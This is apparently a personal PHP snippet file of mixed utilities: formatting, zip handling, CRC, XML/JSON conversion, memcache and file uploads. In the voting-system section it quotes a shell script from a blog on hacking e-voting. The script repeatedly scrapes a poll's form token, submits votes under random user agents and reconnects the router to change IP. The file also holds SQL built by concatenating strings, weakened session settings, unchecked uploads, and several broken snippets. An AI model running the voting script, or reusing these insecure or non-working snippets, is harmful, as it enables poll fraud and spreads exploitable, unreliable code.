<?php
/**
 * Created by PhpStorm.
 * User: emil
 * Date: 16.03.16
 * Time: 11:36
 */

// GET PATH ---------------------------------------------
// basename(__FILE__); // Get File name
// dirname($_SERVER["SCRIPT_FILENAME"]); // Get Dir name
// print_r(pathinfo($_SERVER["SCRIPT_FILENAME"])); // dirname / basename


////////////////////////////////////////////////////////////////
///
/// Print Columns with same distance in terminal
///
////////////////////////////////////////////////////////////////

for($i=0;$i<5;$i++){
   echo "ABC | ";
   echo "".sprintf("%20s",rand(10,6080000080));
   //echo "".sprintf("%20f",rand(10,6080000080)); // for float  00.00
   echo " | BNM".PHP_EOL;
}

// result
// http://sandbox.onlinephpfunctions.com/
// http://phptester.net/
/*
ABC |           2276710444 | BNM
ABC |           4028640142 | BNM
ABC |           3719530466 | BNM
ABC |           5929822460 | BNM
ABC |            493854404 | BNM
*/




// add files to zip
http://php.net/manual/de/ziparchive.addfile.php

$z = new ZipArchive();
if(true === ($z->open('./foo.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE))){
    $z->setArchiveComment('Interesting!');
    $z->addFromString('domain.txt', 'wuxiancheng.cn');
    $folder = './test';
    !is_dir($folder) && mkdir($folder); // Create an folder for testing
    if(true === $z->addFile($folder)){
        echo 'success'; // !!!
    }
    rmdir($folder);
    $z->close();
    // foo.zip will NOT be saved on disk.
    // If foo.zip already exists before we run this script, the file will remain unchanged.
}



if (!class_exists('ZipArchive')) {
    //$myclass = new MyClass();
    die("Installation cannot continue! <br/> Please check if server has ZipArchive installed! ");
}

// # READ ZIP FILES AND DO A LIST
$za = new ZipArchive();
$za->open($unzip_dir);
for( $i = 0; $i < $za->numFiles; $i++ ){
    $stat = $za->statIndex( $i );
    //print "<pre>";
    //print_r( basename( $stat['name'] ) . PHP_EOL );
    if(!preg_match('/svn|post_execute|post_uninstall|pre_execute|pre_uninstall|manifest.php/',$stat['name'])){
        $arZipData[]  = $stat['name'];
    }
    //print "</pre>";
}





# ---------------------------------------------------
# php - Remove not alphanumeric characters from string
# ---------------------------------------------------

utf8_encode(preg_replace('/[^a-z äöüß]/i', '', utf8_decode($str)));
$str=str_replace(array('ä','ö','ü','ß','Ä','Ö','Ü'),array('ae','oe','ue','ss','Ae','Oe','Ue'),$str);

$letters=utf8_encode($_GET['letters']);
$letters=utf8_decode(preg_replace("/[^a-zA-Z-äöüÄÜÖß\/]/i","",$letters));




//-------------------------------------
// php lazy session
//-------------------------------------

# https://why-cant-we-have-nice-things.mwl.be/requests/introduce-session-start-options-read-only-unsafe-lock-lazy-write-and-lazy-destroy

var_export($_SESSION);
var_export($_COOKIE);
var_export($_REQUEST);
var_export($_SERVER);

#session_destroy();
if(!session_start()){
   // send info SERVER
}

//session_start(array('lazy_write'=>true, 'lazy_destroy'=>120, 'unsafe_lock'=>false));

ini_set('session.use_trans_sid',TRUE);
ini_set('session.use_cookies',FALSE);
ini_set('session.use_only_cookies',FALSE);
ini_set('session.use_strict_mode',FALSE);
ini_set('session.save_path', '/usr/tmp/');

session_id('TESTID'.mt_rand(1, 10));
session_start(['lazy_write'=>$_GET['lazy_write'], 'unsafe_lock'=>$_GET['unsafe_lock']]);

if (!isset($session['x'])) {
   $_SESSION['x'] = str_repeat('x', 1024*10);
}

echo session_id();
var_dump(session_module_feature());

usleep(20000);

/*
$ ab -c 50 -n 20000 'http://localhost:1080/session.php?lazy_write=1&unsafe_lock=1'
This is ApacheBench, Version 2.3 <$Revision: 1430300 $>
$ ab -c 50 -n 20000 'http://localhost:1080/session.php?lazy_write=0&unsafe_lock=0'
*/







// PHP --- check if dir exits ---------------------------

if (!is_dir($dir)) {
   mkdir($dir);
}

if (!file_exists($dir) && !is_dir($dir)) {
   mkdir($dir);
}




// PHP --- cli mode---------------------------
// check if php in cli mode - terminal

if (php_sapi_name() == "cli") {
   // In cli-mode
} else {
   // Not in cli-mode
}















// PHP --- crc mode---------------------------
// check crc32

$data = "0A312C288256B000";

function crc($data){

   $i = 0;
   $crc = 0;

   $crc_table = array
   (
      0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50a5, 0x60c6, 0x70e7,
      0x8108, 0x9129, 0xa14a, 0xb16b, 0xc18c, 0xd1ad, 0xe1ce, 0xf1ef
   );

   $data = hex2bin($data);
   $l = 0;
   while($l < strlen($data)){

      $byte = $data[$l];
      $i = (($crc >> 12) ^ (ord($byte) >> 4));
      $crc = ($crc_table[$i & 0x0F] ^ ($crc << 4));
      $i = (($crc >> 12) ^ ord($byte));
      $crc = ($crc_table[$i & 0x0F] ^ ($crc << 4));
      $l++;

   }

   return ($crc & 0xFFFF);
}


echo crc($data);

# https://stackoverflow.com/questions/1834541/crc-4-implementation-in-c-sharp
# https://stackoverflow.com/questions/38084462/translate-crc-alrgorythm-from-c-to-php

# http://php.net/manual/de/function.hash-file.php
# http://php.net/manual/de/function.crc32.php
# http://php.net/manual/en/function.hash-file.php

echo hash("crc32", __FILE__).PHP_EOL;
echo hash("crc32b", __FILE__).PHP_EOL;
hash_file('crc32', __FILE__).PHP_EOL;





#################################################
#
# PHP Sorting find duplicates
#
#################################################

http://php.net/manual/de/function.min.php
http://php.net/manual/de/function.asort.php
http://php.net/manual/de/function.array-multisort.php
http://php.net/manual/de/function.json-encode.php

print_r(array_count_values($array)); # find duplicates



https://www.codepunker.com/blog/3-solutions-for-multidimensional-array-sorting-by-child-keys-or-values-in-PHP
https://paulund.co.uk/sort-multi-dimensional-array-value
https://blog.jachim.be/2009/09/php-msort-multidimensional-array-sort/comment-page-1/
http://php.net/manual/en/function.sprintf.php

#################################################
#
# PHP Formating
#
#################################################


printf("[%s]\n",      $s); // standard string output
printf("[%10s]\n",    $s); // right-justification with spaces
printf("[%-10s]\n",   $s); // left-justification with spaces
printf("[%010s]\n",   $s); // zero-padding works on strings too
printf("[%'#10s]\n",  $s); // use the custom padding character '#'
printf("[%10.10s]\n", $t); // left-justification but with a cutoff of 10 characters

#################################################
#
# PHP Encode Decode to array
#
#################################################

$strJson = json_encode($arTmp); // encode json
file_put_contents('somefile.json',$strJson); // write array into json file
$strTmpJson = (array) json_decode(file_get_contents('somefile.json'), true); // json file into array
echo sprintf("%20s","somevar : ") .$somerow["key"]. "\n";
file_put_contents($file, $person, FILE_APPEND | LOCK_EX); // append str into file


/*
$filename = "update_np_prices";
header("Content-type: text/csv");
header("Content-Disposition: attachment; filename={$filename}.csv");
header("Pragma: no-cache");
header("Expires: 0");
outputCSV($arTmp);


function outputCSV($data) {
   $outputBuffer = fopen("php://output", 'w');
   foreach($data as $val) {
      fputcsv($outputBuffer, $val);
   }
   fclose($outputBuffer);
}*/


#################################################
#
# PHP Sum
#
#################################################

Sum values in foreach loop php [closed]

$sum = 0;
foreach($group as $key=>$value)
{
   $sum+= $value;
}
echo $sum;

#################################################
#
# xml2array
#
#################################################

$xml = simplexml_load_string($xmlstring, "SimpleXMLElement", LIBXML_NOCDATA);
$json = json_encode($xml);
$array = json_decode($json,TRUE);




#################################################
#
#   Memcache Usage
#   http://adammaus.com/wp/2014/07/caching-pdo-query-results-memcache/
#
#################################################

global $memcache, $db, $cache_expiration;

// Connect to the Memcache server
$memcache = new Memcache();
$memcache->pconnect('localhost', 11211);


if ($memcache->get($cache_key)) {
	// Generate a key for the cache
	$cache_key = md5($sql . serialize($params));
	$result = $memcache->get($cache_key);
}


// Cache expires in 10 seconds
$cache_key = md5($sql . serialize($params));
$cache_expiration = 10;
$memcache->set($cache_key, serialize($result), MEMCACHE_COMPRESSED, $cache_expiration);







#################################################
#
#   fibonacci
#
#################################################


function fibonacci($n,$first = 0,$second = 1)
{
    $fib = [$first,$second];
    for($i=1;$i<$n;$i++)
    {
        $fib[] = $fib[$i]+$fib[$i-1];
    }
    return $fib;
}
echo "<pre>";
print_r(fibonacci(10));



function fibonacci_second($a,$b,$limit){
	echo "<br>".($a + $b);
	if($b < $limit){
		fibonacci2($b, $a +$b,$limit);
	}
}

$a = 0; $b = 1;
fibonacci_second($a,$b,25);







#################################################
#
#   To get the Raw Post Data
#
#################################################

<?php $postdata = file_get_contents("php://input"); ?>

#################################################
#
#   Save POST FILE DATA
#
#################################################

<?php
// In PHP kleiner als 4.1.0 sollten Sie $HTTP_POST_FILES anstatt
// $_FILES verwenden.

$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

echo '<pre>';
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "Datei ist valide und wurde erfolgreich hochgeladen.\n";
} else {
    echo "Möglicherweise eine Dateiupload-Attacke!\n";
}

echo 'Weitere Debugging Informationen:';
print_r($_FILES);

print "</pre>";

?>

#################################################
#
#   Get file Extension
#   http://techieroop.com/best-way-to-extract-a-file-extension-in-php/
#
#################################################

$ext = pathinfo($filename, PATHINFO_EXTENSION);
$ext = substr(strrchr($fileName, '.'), 1);
$ext = preg_replace('/^.*\.([^.]+)$/D', '$1', $fileName);



#################################################
#   Test submit file on httpbin.org
#################################################

<?php
require 'vendor/autoload.php';

$client = new GuzzleHttp\Client();
$history = new \GuzzleHttp\Subscriber\History();
$client->getEmitter()->attach($history);

$client->post('http://httpbin.org/post', [
    'body' => [
      'submit' => 'Upload packages',
      'MAX_FILE_SIZE' => 2097152,
      'form_name' => 'package_csv_form',
      'my_file' => fopen(__FILE__, 'r')
    ]
]);

echo $history;


##############################################################
# encode array to json
##############################################################

return \GuzzleHttp\json_encode($arrJSON);






####################################################################
#
#	Daily voting system with IP
#
####################################################################


//
$sql = "SELECT COUNT(*) as rowCount FROM ".$this->_voterTable." WHERE ip='".$ip."' AND DATE(latestVoteDate) = CURDATE()";

//
$conn = mysqli_connect("localhost","my_user","my_password","my_db");
$query = mysqli_query( $conn,  $sql );
$data = mysqli_fetch_assoc( $query );

if($data['rowCount'] > 0)
{
   die("You are not allowed to vote");
}
else
{
   // Show the voting page or partial
}

// update
$sql = "UPDATE ".$this->_voterTable." SET latestVoteDate = CURDATE() WHERE ip = '" . $ip . "';";
mysqli_query($conn, $sql);

---------------------------------------------------------------------------------
https://xrds.acm.org/blog/2013/12/how-to-hack-a-sketchy-e-voting-system/

#!/bin/sh
while [ 1 ]
do
    rm cookie.txt
    agent=$(sort agents.txt -R | grep “Mozil\|Oper” | head -n 1)
    wget \
         –quiet \
         -O form.html \
         –keep-session-cookies –save-cookies=cookie.txt \
         –referer=”http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll” \
         –user-agent=”$agent” \
         “http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll&Itemid=161”
    token=$(grep “name=\”[0-9a-f]\{32\}\”” form.html | grep -o “[0-9a-f]\{32\}” 2>/dev/null)
    if [ “” != “$token” ]; then
    wget \
         –quiet \
         -O submit.html \
         –keep-session-cookies –load-cookies=cookie.txt \
         –post-data=”voteid=13&option=com_acepolls&task=vote&id=1&$token=1&task_button=Vote” \
         –referer=”http://foo.com/index.php?option=com_acepolls&view=poll&id=1:rock-poll” \
         –user-agent=”$agent” \
         “http://foo.com/index.php?option=com_acepolls&view=polls&Itemid=161”
    fi
    success=$(grep -o “Thank you for voting!” submit.html 2>/dev/null)
    if [ “” != “$success” ]
         then success=”1″
         else success=”0″
    fi
    wget -O routerresponse.html –post-data=”PPP_Disconnect=1&PPP_Connect=0″ “http://192.168.2.1/cgi-bin/statusprocess.exe”
    sleep 3
    dslon=””
    while [ “” == “$dslon” ]
    do
         sleep 1
         dslon=$(ping -c 1 195.251.251.19 | grep -o “1 packets” 2>/dev/null)
    done
    sleep 10
done













############################################################
#
# Delete files older than X days
#
############################################################

if ($handle = opendir(DIR_SOMEPATH)) {
   while (false !== ($strDirFile = readdir($handle))) {
      if ($strDirFile != "." && $strDirFile != "..") {
         $arrFileDirShare[] = $strDirFile;
         $entryDate = substr($strDirFile,0,4)."-".substr($strDirFile,4,2)."-".substr($strDirFile,6,2);
         $dateFile =  date("Y-m-d H:i:s",strtotime($entryDate));
         #$dateToday =  date("Y-m-d H:i:s", strtotime(date("Y-m-d")." +1weeks"));
         $oDateFile = new DateTime($dateFile);
         $oDateNow = new DateTime();
         $oDiffDate = date_diff( $oDateNow, $oDateFile );
         $days =  $oDiffDate->format('%d '); // days
         // delete files after x days
         if( $days > 7 ){
            if(unlink(DIR_SOMEPATH.$strDirFile)){
               clearstatcache();
               echo "Deleted succesfully: ".DIR_SOMEPATH.$strDirFile.PHP_EOL;
            }else{
               echo "Warning! File cannot be Deleted: ".DIR_SOMEPATH.$strDirFile.PHP_EOL;
            }
         }
      }
   }
   closedir($handle);
}






############################################################

// Array Comparison
// http://phptester.net

############################################################

$arrayA = array(

    "0" => "11.png",
    "1" => "22.csv",
);

$arrayB = array(
    "0" => "11.png",
    "1" => "22.csv",
    20 => "77.png",
    21 => "88.jpg",
    22 => "99.jpg",
);

print "<pre>";
print_r($arrayA);
print_r($arrayB);

print_r(array_diff($arrayB,$arrayA)); // difference from both arr
print_r(array_intersect($arrayB,$arrayA)); // similar in both arr
print_r(array_diff_assoc($arrayB,$arrayA)); // difference from both arr

$arrDiffNew = array();
foreach($arrayB as $DirFile){
	if(!in_array($DirFile,$arrayA)){
		$arrDiffNew[] = $DirFile;
	}
}
print_r($arrDiffNew);
/*
-------------------------------------------------
Output:

Array arrayA
(
    [0] => 11.png
    [1] => 22.csv
)
Array arrayB
(
    [0] => 11.png
    [1] => 22.csv
    [20] => 77.png
    [21] => 88.jpg
    [22] => 99.jpg
)
Array array_diff()
(
    [20] => 77.png
    [21] => 88.jpg
    [22] => 99.jpg
)
Array array_intersect()
(
    [0] => 11.png
    [1] => 22.csv
)
Array array_diff_assoc()
(
    [20] => 77.png
    [21] => 88.jpg
    [22] => 99.jpg
)
Array in_array()
(
    [0] => 77.png
    [1] => 88.jpg
    [2] => 99.jpg
)
*/








######################################################################
#
# 	Generate xml from object / array
#	http://www.sean-barton.co.uk/2009/03/turning-an-array-or-object-into-xml-using-php/
#
######################################################################

/**
    * @param $array
    * @param $node_name
    * @return string
    */
   public function generate_xml_from_array($array, $node_name) {
      $xml = '';
      if (is_array($array) || is_object($array)) {
         foreach ($array as $key=>$value) {
            if (is_numeric($key)) {
               $key = $node_name;
            }
            if($value){
               if($key) $xml .= '<' . $key . '>';
               $xml .= $this->generate_xml_from_array($value, $node_name);
               if($key) $xml .='</' . $key . '>' . ""; // \n
            }
         }
      } else {
         $xml = htmlspecialchars($array, ENT_QUOTES) . ""; // \n
      }

      return $xml;
   }

   /**
    * @param $array
    * @param string $node_block
    * @param string $node_name
    * @return string
    */
   public function generate_valid_xml_from_array($array, $node_block='', $node_name='') {
      $xml = '<?xml version="1.0" encoding="UTF-8" ?>' . "\n";
      if($node_block) $xml .= '<' . $node_block . '>' ;
      $xml .= $this->generate_xml_from_array($array, $node_name);
      if($node_block) $xml .= '</' . $node_block . '>' . ""; // \n
      return $xml;
   }



######################################################################
#
#	Revers xml to arrays
#	https://stackoverflow.com/questions/6578832/how-to-convert-xml-into-array-in-php
#
######################################################################

$xml = simplexml_load_string($xmlstring, "SimpleXMLElement", LIBXML_NOCDATA);
$json = json_encode($xml);
$array = json_decode($json,TRUE);



######################################################################
#
#   Print formated xml in terminal
#
######################################################################

$xml = $this->generate_valid_xml_from_array($objectArray);
$newfile = "somefile.xml";

/* @var $xml SimpleXMLElement */
$domxml = new DOMDocument('1.0');
$domxml->preserveWhiteSpace = true;
$domxml->formatOutput = true;
$domxml->loadHTML($xml);
$xml_string = $domxml->saveXML();
#$domxml->save($newfile);
print "<pre>"; print_r($xml_string);
exit;



https://stackoverflow.com/questions/8615422/php-xml-how-to-output-nice-format
http://www.php.net/manual/en/tidy.repairstring.php


$xml_string = preg_replace('/(?:^|\G)  /um', "\t", $xml_string);
tidy_repair_string($xml_string, ['input-xml'=> 1, 'indent' => 1, 'wrap' => 0]);

* * * * *

$dom = new DOMDocument();
// Initial block (must before load xml string)
$dom->preserveWhiteSpace = false;
$dom->formatOutput = true;
// End initial block
$dom->loadXML($xml);
$out = $dom->saveXML();
print_R($out);
